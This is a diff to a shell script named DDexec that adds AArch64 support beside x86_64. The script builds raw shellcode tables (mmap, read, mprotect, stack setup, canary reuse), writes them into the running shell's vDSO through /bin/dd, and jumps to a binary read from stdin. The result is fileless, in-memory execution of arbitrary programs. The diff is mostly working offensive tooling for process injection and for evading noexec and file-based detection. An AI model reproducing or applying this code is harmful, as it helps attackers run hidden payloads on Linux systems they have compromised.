@@ -3,7 +3,8 @@
 filename=/bin/dd
 
 # Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
-# Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
+# Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'.
+# In ARM64 use `set *(int*)$pc=0xd503201f'.
 if [ -z "$DEBUG" ]; then DEBUG=0; fi
 
 # If /bin/dd is not executable by your user you may try to run it through the
@@ -14,6 +15,40 @@ if [ -z "$USE_INTERP" ]; then USE_INTERP=0; fi
 endian()
 {
     echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
+}
+
+sc_chunk()
+{
+    echo "$sc_array" | grep -w $1 | cut -f2
+}
+# load_imm $regnum $addr
+load_imm()
+{
+    # A crash course on Aarch64 instruction encoding:
+    # 1 10 100101 S[22:21] I[20:5] Rd[4:0] = movz Rd, #I, lsl #(S * 16)
+    # 1 11 100101 S[22:21] I[20:5] Rd[4:0] = movk Rd, #I, lsl #(S * 16)
+    local opcode=0
+    # movz Rd, #(I & 0xffff)
+    opcode=$((0xd2800000 | $1 | ((0x$2 & 0xffff) << 5)))
+    endian $(printf "%08x" "$opcode")
+    if [ $((0x$2)) -gt $((0xffff)) ]
+    then
+        # movk Rd, #((I >> 16) & 0xffff), lsl #16
+        opcode=$((0xf2a00000 | $1 | (((0x$2 >> 16) & 0xffff) << 5)))
+        endian $(printf "%08x" "$opcode")
+        if [ $((0x$2)) -gt $((0xffffffff)) ]
+        then
+            # movk Rd, #((I >> 32) & 0xffff), lsl #32
+            opcode=$((0xf2c00000 | $1 | (((0x$2 >> 32) & 0xffff) << 5)))
+            endian $(printf "%08x" "$opcode")
+            if [ $((0x$2)) -gt $((0xffffffffffff)) ]
+            then
+                # movk Rd, #((I >> 48) & 0xffff), lsl #48
+                opcode=$((0xf2e00000 | $1 | (((0x$2 >> 48) & 0xffff) << 5)))
+                endian $(printf "%08x" "$opcode")
+            fi
+        fi
+    fi
 }
 
 # search_section "file" $filename $section
@@ -134,10 +169,10 @@ shellcode_loader()
     local sc=""
     if [ $1 = "bin" ]
     then
-        sc=$sc"4d31c04d89c149f7d041ba32000000" # Prepare for the mmap()s
+        sc=$sc$(eval echo $(sc_chunk prep)) # Prepare for the mmap()s
     else
-        sc=$sc"4831c04889c6b00248bf""__tagtagtagtag__""0f05" # open() the file
-        sc=$sc"4989c041ba12000000" # and prepare for the mmap()s
+        # open() and prepare for the mmap()s
+        sc=$sc$(eval echo $(sc_chunk openprep))
     fi
 
     for i in $(seq 0 $((phnum - 1)))
@@ -155,18 +190,14 @@ shellcode_loader()
                 local stack_bottom=0000$(echo $stack_bottom | cut -d'-' -f1)
                 local stack_size=$((0x$stack_top - 0x$stack_bottom))
                 stack_size=$(printf %08x $stack_size)
-                sc=$sc"4831c0b00a"
-                sc=$sc"48bf"$(endian $stack_bottom)
-                sc=$sc"be"$(endian $stack_size)
-                sc=$sc"ba""07000000" # RWX
-                sc=$sc"0f05"
+                sc=$sc$(eval echo $(sc_chunk stackexe))
             fi
             continue
         fi
         if [ $phenttype != "01000000" ]; then continue; fi # type != LOAD
         local offset=$(endian ${phent:16:16})
         local virt=$(endian ${phent:32:16})
-        local fsize=${phent:64:16}
+        local fsize=$(endian ${phent:64:16})
         local memsz=$(endian ${phent:80:16})
 
         if [ $((0x$offset)) -eq 0 ]
@@ -186,41 +217,26 @@ shellcode_loader()
 
         local finalvirt=$((((0x$virt + 0x$memsz) & (~0xfff)) + 0x1000))
 
-        local origvirt=$(endian $virt)
+        local origvirt=$virt
         virt=$((0x$virt & (~0xfff))) # The mapping must be aligned
         memsz=$((finalvirt - virt)) # True size of the mapping
-        memsz=$(endian $(printf %08x $memsz))
-        virt=$(endian $(printf %016x $virt))
+        memsz=$(printf %08x $memsz)
+        virt=$(printf %016x $virt)
 
         local perm=0
         if [ $((0x$prot & 1)) -eq 1 ]; then perm=$((perm | 4)); fi
         if [ $((0x$prot & 2)) -eq 2 ]; then perm=$((perm | 2)); fi
         if [ $((0x$prot & 4)) -eq 4 ]; then perm=$((perm | 1)); fi
-        perm=$(endian $(printf %08x $perm))
+        perm=$(printf %08x $perm)
         if [ $1 = "bin" ]
         then
-            # mmap()
-            sc=$sc"4831c0b00948bf"$virt
-            sc=$sc"be"$memsz
-            sc=$sc"ba""03000000" # RW
-            sc=$sc"0f05"
-
-            # read()
-            sc=$sc"4831ff48be${origvirt}48ba${fsize}4889f80f05"
-            # and make sure to read exactly $fsize bytes
-            sc=$sc"4829c24801c64885d275f0"
-
-            # mprotect()
-            sc=$sc"4831c0b00a"
-            sc=$sc"48bf"$virt
-            sc=$sc"be"$memsz
-            sc=$sc"ba"$perm
-            sc=$sc"0f05"
+            # mmap() (RW) & read() (preventing underflow) & mprotect()
+            sc=$sc$(eval echo $(sc_chunk mrmbin))
 
             # Pieces of the binary that we need to write
             # (we only load things the binary itself asks us to)
             writebin=$writebin$(echo $bin | base64 -d | od -v -t x1 -N \
-                     $((0x$(endian $fsize))) -j $((0x$offset)) |\
+                     $((0x$fsize)) -j $((0x$offset)) |\
                      head -n-1 | cut -d' ' -f2- | tr -d ' \n')
         else
             # mmap requires the offset to be aligned to 0x1000 too
@@ -231,35 +247,25 @@ shellcode_loader()
             local filelen=$((($(wc -c < $2) & (~0xfff)) + 0x1000))
             # If the mapping exceeds the file, split it into two
             # (some Linux distros, like Alpine, don't like it)
-            if [ $((0x$off + 0x$(endian $memsz))) -gt $filelen ]
+            if [ $((0x$off + 0x$memsz)) -gt $filelen ]
             then
-                local diff=$((0x$off + 0x$(endian $memsz) - $filelen))
-                memsz=$((0x$(endian $memsz) - diff))
-                local virt2=$((0x$(endian $virt) + memsz))
-                virt2=$(endian $(printf %016x $virt2))
-                memsz=$(endian $(printf %08x $memsz))
-                diff=$(endian $(printf %08x $diff))
-                sc2="4d89c44d31c04d89c149f7d041ba32000000"
-                sc2=$sc2"4831c0b00948bf"$virt2
-                sc2=$sc2"be"$diff
-                sc2=$sc2"ba"$perm
-                sc2=$sc2"0f05"
-                sc2=$sc2"4d89e0"
+                local diff=$((0x$off + 0x$memsz - $filelen))
+                memsz=$((0x$memsz - diff))
+                local virt2=$((0x$virt + memsz))
+                virt2=$(printf %016x $virt2)
+                memsz=$(printf %08x $memsz)
+                diff=$(printf %08x $diff)
+                sc2=$sc2$(eval echo $(sc_chunk mrmfile2)) # mmap()
             fi
 
-            # mmap()
-            sc=$sc"4831c0b00948bf"$virt
-            sc=$sc"be"$memsz
-            sc=$sc"ba"$perm
-            sc=$sc"49b9"$(endian $off)
-            sc=$sc"0f05"
+            sc=$sc$(eval echo $(sc_chunk mrmfile)) # mmap()
 
             sc=$sc$sc2
         fi
 
         if [ $((0x$offset)) -eq 0 ]
         then
-            phaddr=$((phoff + 0x$(endian $origvirt)))
+            phaddr=$((phoff + 0x$origvirt))
         fi
     done
     entry=$(endian $(printf %016x $entry))
@@ -268,7 +274,7 @@ shellcode_loader()
     local bss_addr=0
     if [ $1 = "file" ]
     then
-        sc=$sc"4831c0b0034c89c70f05" # close() the file
+        sc=$sc$(eval echo $(sc_chunk close)) # close()
         bss_addr=$(search_section file $2 .bss | cut -d' ' -f3)
     else
         bss_addr=$(echo -n $bin | search_section bin "" .bss | cut -d' ' -f3)
@@ -279,9 +285,8 @@ shellcode_loader()
         # Zero until the end of page
         local bss_size=$((((bss_addr + 0x1000) & (~0xfff)) - bss_addr))
         bss_addr=$(printf %016x $bss_addr)
-        bss_size=$((bss_size / 8))
-        bss_size=$(printf %08x $bss_size)
-        sc=$sc"4831c0b9"$(endian $bss_size)"48bf"$(endian $bss_addr)"f348ab"
+        bss_size=$(printf %08x $((bss_size >> 3)))
+        sc=$sc$(eval echo $(sc_chunk zerobss))
     fi
 
     phnum=$(endian $(printf %016x $phnum))
@@ -340,21 +345,20 @@ craft_stack()
     auxv=$auxv"1900000000000000"$at_random         # AT_RANDOM
     auxv=$auxv"0600000000000000""0010000000000000" # AT_PAGESZ
     auxv=$auxv"0000000000000000""0000000000000000" # AT_NULL
-    auxv=$auxv"aaaaaaaaaaaaaaaa""bbbbbbbbbbbbbbbb" # Will be two random values
+    auxv=$auxv"aaaaaaaaaaaaaaaa""bbbbbbbbbbbbbbbb" # Should be two random values
 
     stack=$stack$auxv$args"0000000000000000" # NULL at the end of the stack
 
-    # read() all this data into the stack and make rsp point to it
+    # read() all this data into the stack and make the sp point to it
     local sc=""
     local stack_len=$((${#stack} / 2))
-    local rsp=$(endian $(printf %016x $((0x$stack_top - $stack_len))))
-    stack_len=$(endian $(printf %08x $stack_len))
-    sc=$sc"48bc"$rsp
-    sc=$sc"4831ff4889e6ba${stack_len}4889f80f0529c24801c685d275f3"
+    local sp=$(printf %016x $((0x$stack_top - $stack_len)))
+    stack_len=$(printf %08x $stack_len)
+    sc=$sc$(eval echo $(sc_chunk stack))
 
     # Reuse canary and PTR_MANGLE key, place them in AT_RANDOM field of the auxv
-    sc=$sc"48bb"$at_random
-    sc=$sc"64488b04252800000048890380c30864488b042530000000488903"
+    sc=$sc
+    sc=$sc$(eval echo $(sc_chunk canary))
 
     echo -n $stack $sc
 }
@@ -387,36 +391,79 @@ craft_shellcode()
     stack=$(echo $stack | cut -d' ' -f1)
 
     # The shell has the stdin pointing to a pipe, so we make dup2(2, 0)
-    sc=${sc}"4831c04889c6b0024889c7b0210f05"
+    sc=$sc$(eval echo $(sc_chunk dup))
 
     if [ -n "$interp" ] # Dynamic binary
     then
         # Load the loader (wait... a-are we the kernel now?)
-        local loadldsc=$(shellcode_loader file $interp $ld_base $interp_addr)
-        sc=${sc}$(echo $loadldsc | cut -d' ' -f1)
+        local loadldsc=$(shellcode_loader file $interp $ld_base)
+        sc=$sc$(echo $loadldsc | cut -d' ' -f1)
 
         # Jump to the loader and let it do the rest
         ld_start_addr=$(od -t x8 -j 24 -N 8 $interp | head -n1 | cut -d' ' -f2)
         ld_start_addr=$((0x$ld_start_addr + 0x$ld_base))
         ld_start_addr=$(printf %016x $ld_start_addr)
 
-        sc=$sc"48b8"$(endian $ld_start_addr)
+        sc=$sc$(eval echo $(sc_chunk jmpld))
     else                                                        # Static binary
-        sc=$sc"48b8"$entry # Just jump to the binary's entrypoint
+        sc=$sc$(eval echo $(sc_chunk jmpbin)) # Just jump to the binary's entry
     fi
     # Nothing happened here, dd never existed.
     # It was all a dream!
-    sc=$sc"ffe0"
+    sc=$sc$(eval echo $(sc_chunk jmp))
 
-    if [ $DEBUG -eq 1 ]; then sc="ebfe"$sc; fi
+    if [ $DEBUG -eq 1 ]; then sc=$(eval echo $(sc_chunk loop))$sc; fi
 
     printf "$sc $writebin$stack"
 }
 
-# Program we are trying to execute
+arch=$(uname -m)
+if [ "$arch" = "x86_64" ]
+then
+    sc_array='prep	4d31c04d89c149f7d041ba32000000
+openprep	4831c04889c6b00248bf________________0f054989c041ba12000000
+stackexe	4831c0b00a48bf$(endian $stack_bottom)be$(endian $stack_size)ba070000000f05
+mrmbin	4831c0b00948bf$(endian $virt)be$(endian $memsz)ba030000000f054831ff48be$(endian $origvirt)48ba$(endian $fsize)4889f80f054829c24801c64885d275f04831c0b00a48bf$(endian $virt)be$(endian $memsz)ba$(endian $perm)0f05
+mrmfile2	4d89c44d31c04d89c149f7d041ba320000004831c0b00948bf$(endian $virt2)be$(endian $diff)ba$(endian $perm)0f054d89e0
+mrmfile	4831c0b00948bf$(endian $virt)be$(endian $memsz)ba$(endian $perm)49b9$(endian $off)0f05
+close	4831c0b0034c89c70f05
+zerobss	4831c0b9$(endian $bss_size)48bf$(endian $bss_addr)f348ab
+stack	48bc$(endian $sp)4831ff4889e6ba$(endian $stack_len)4889f80f0529c24801c685d275f3
+canary	48bb${at_random}64488b04252800000048890380c30864488b042530000000488903
+dup	4831c04889c6b0024889c7b0210f05
+jmpld	48b8$(endian $ld_start_addr)
+jmpbin	48b8$entry
+jmp	ffe0
+loop	ebfe
+'
+elif [ "$arch" = "aarch64" ]
+then
+    sc_array='prep	430680d204008092a50005ca
+openprep	080780d2600c8092420002ca________________010000d4e40300aa430280d2
+stackexe	481c80d2$(load_imm 0 $stack_bottom)$(load_imm 1 $stack_size)$(load_imm 2 00000007)010000d4
+mrmbin	c81b80d2$(load_imm 0 $virt)$(load_imm 1 $memsz)$(load_imm 2 00000003)010000d4e80780d2$(load_imm 1 $origvirt)$(load_imm 2 $fsize)000000ca010000d4420000cb2100008b5f0000f161ffff54481c80d2$(load_imm 0 $virt)$(load_imm 1 $memsz)$(load_imm 2 $perm)010000d4
+mrmfile2	f30304aa04008092a50005ca430680d2c81b80d2$(load_imm 0 $virt2)$(load_imm 1 $diff)$(load_imm 2 $perm)010000d4e40313aa
+mrmfile	c81b80d2$(load_imm 0 $virt)$(load_imm 1 $memsz)$(load_imm 2 $perm)$(load_imm 5 $off)010000d4
+close	280780d2e00304aa010000d4
+zerobss	$(load_imm 0 $bss_addr)$(load_imm 1 $bss_size)1f8400f8210400d13f0000f1a1ffff54
+stack	$(load_imm 0 $sp)1f000091$(load_imm 2 $stack_len)e80780d2e1030091000000ca010000d4420000cb2100008b5f0000f161ffff54
+canary	
+dup	080380d2400080d2010080d2010000d4
+jmpld	$(load_imm 0 $ld_start_addr)
+jmpbin	$(load_imm 0 $(endian $entry))
+jmp	00001fd6
+loop	00000014
+'
+else
+    echo "DDexec: Error, this architecture is not supported." >&2
+    exit
+fi
+
+# Program we are trying to run
 read -r bin
 
 shell=$(readlink -f /proc/$$/exe)
+
 # Make zsh behave somewhat like bash
 if [ -n "$($shell --version 2> /dev/null | grep zsh)" ]
 then
@@ -450,7 +497,6 @@ fi
 shell_maps=$(cat /proc/$$/maps)
 shell_base=$(echo "$shell_maps" | grep -w $shell |\
             head -n1 | cut -d'-' -f1)
-# Address of the string with the path to the loader
 
 # The shellcode will be written into the vDSO
 vdso_addr=$((0x$(echo "$shell_maps" | grep -F "[vdso]" | cut -d'-' -f1)))
@@ -462,12 +508,29 @@ sc=$(echo $sc | cut -d' ' -f1)
 sc_len=$((${#sc} / 2))
 
 sc=$sc$(echo -n $interp | od -vtx1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')00
-interp_addr=$(printf %016x $((vdso_addr + sc_len)))
-sc=${sc/__tagtagtagtag__/$(endian $interp_addr)}
+if [ "$arch" = "x86_64" ]
+then
+    interp_addr=$(printf %016x $((vdso_addr + sc_len)))
+    sc=${sc/________________/$(endian $interp_addr)}
+elif [ "$arch" = "aarch64" ]
+then
+    # Relative addressing
+    pos=${sc%%_*}
+    pos=$((${#pos} / 2))
+    rel=$((((((sc_len - pos) >> 2) << 5) | 1) | (16 << 24)))
+    rel=$(endian $(printf %08x $rel))"1f2003d5"
+    sc=${sc/________________/$rel}
+fi
 sc_len=$((${#sc} / 2))
 
 # Trampoline to jump to the shellcode
-jmp="48b8"$(endian $(printf %016x $vdso_addr))"ffe0"
+if [ "$arch" = "x86_64" ]
+then
+    jmp="48b8"$(endian $(printf %016x $vdso_addr))"ffe0"
+elif [ "$arch" = "aarch64" ]
+then
+    jmp=$(load_imm 0 $(printf %016x $vdso_addr))"00001fd6"
+fi
 
 sc=$(printf $sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 data=$(printf $data | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
